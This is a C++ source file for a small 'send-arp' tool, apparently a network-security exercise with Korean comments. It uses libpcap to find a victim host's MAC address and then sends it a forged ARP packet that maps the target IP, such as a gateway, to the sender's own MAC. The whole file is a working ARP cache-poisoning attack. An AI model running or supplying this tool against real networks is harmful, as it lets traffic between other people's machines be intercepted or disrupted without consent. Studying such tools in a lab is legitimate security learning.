#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <string.h>
#include <stdlib.h>
#include <cstdio>
#include <pcap.h>
#include <libnet.h>
#include <netinet/in.h>
#include "ethhdr.h"
#include "arphdr.h"



#pragma pack(push, 1)
struct EthArpPacket {
    EthHdr eth_;
    ArpHdr arp_;
};
#pragma pack(pop)

Mac GetMyMac(char *interface);
Mac GetVictimMac(pcap *handle, char *sender,Mac myMac, char *interface);
void GetMyIp(char *interface, char *ip_buffer);

void usage() {
    printf("syntax: send-arp <interface> <sender ip> <target ip>\n");
    printf("sample: send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

int main(int argc, char* argv[]) {
    if (argc != 4) {
        usage();
        return -1;
    }

    char* dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if (handle == NULL) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return -1;
    }
    Mac mymac = GetMyMac(argv[1]);
    Mac vmac = GetVictimMac(handle, argv[2],mymac, argv[1]);

    EthArpPacket packet;

    packet.eth_.dmac_ = Mac(vmac);
    packet.eth_.smac_ = Mac(mymac);
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Request);
    packet.arp_.smac_ = mymac;
    packet.arp_.sip_ = htonl(Ip(argv[3]));
    packet.arp_.tmac_ = vmac;
    packet.arp_.tip_ = htonl(Ip(argv[2]));

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }
    printf("\n\nComplete!!\n\n");
    pcap_close(handle);
}

void GetMyIp(char *interface, char *ip_buffer){
    int fd;
    struct ifreq ifr;

    fd = socket(AF_INET, SOCK_DGRAM, 0);

    ifr.ifr_addr.sa_family = AF_INET;
    strncpy(ifr.ifr_name, interface, IFNAMSIZ -1);

    ioctl(fd, SIOCGIFADDR, &ifr);
    close(fd);

    sprintf(ip_buffer, "%s", inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr));
}

Mac GetMyMac(char *interface){
    int s;
    struct ifreq ifr;
    s = socket(AF_INET, SOCK_DGRAM, 0);
    strcpy(ifr.ifr_name, interface);
    ioctl(s, SIOCGIFHWADDR, &ifr);
    uint8_t data[6];
    char *buf;
    buf = ifr.ifr_hwaddr.sa_data;
    char *dest = (char *)malloc(sizeof(buf[0]));
    strncpy(dest, buf ,1);
    data[0] = *dest;
    strncpy(dest, buf+1 ,1);
    data[1] = *dest;
    strncpy(dest, buf+2 ,1);
    data[2] = *dest;
    strncpy(dest, buf+3 ,1);
    data[3] = *dest;
    strncpy(dest, buf+4 ,1);
    data[4] = *dest;
    strncpy(dest, buf+5 ,1);
    data[5] = *dest;
    return Mac(data);
}
Mac GetVictimMac(pcap *handle, char *sender,Mac myMac, char *interface){
    while (1){
        char ipbuf[32];
        struct pcap_pkthdr* header;
        const u_char* packet2;
        uint8_t data[6];
        int res = pcap_next_ex(handle, &header, &packet2);//arp repl를 받끼전에 열기
        if (res == 0) continue;
        if (res == -1 || res == -2) {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
            break;
        }
        struct libnet_ethernet_hdr *eth = (libnet_ethernet_hdr *)packet2;
        if(eth->ether_type == htons(EthHdr::Arp))//arp 패킷인지 확인
        {
            for(int i =0;i < 6;i++){
                data[i] = eth->ether_shost[i];
            }
            return Mac(data);
        }
        //arp 패킷 전송
        EthArpPacket packet;
        packet.eth_.dmac_ = Mac("FF:FF:FF:FF:FF:FF");
        packet.eth_.smac_ = Mac(std::string(myMac));
        packet.eth_.type_ = htons(EthHdr::Arp);
        packet.arp_.hrd_ = htons(ArpHdr::ETHER);
        packet.arp_.pro_ = htons(EthHdr::Ip4);
        packet.arp_.hln_ = Mac::SIZE;
        packet.arp_.pln_ = Ip::SIZE;
        packet.arp_.op_ = htons(ArpHdr::Request);
        packet.arp_.smac_ = Mac(std::string(myMac));
        GetMyIp(interface, ipbuf);
        packet.arp_.sip_ = htonl(Ip(ipbuf));
        packet.arp_.tmac_ = Mac("FF:FF:FF:FF:FF:FF");
        packet.arp_.tip_ = htonl(Ip(sender));
        int resd = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
        if(resd == 0){
            continue;
        }
    }
}
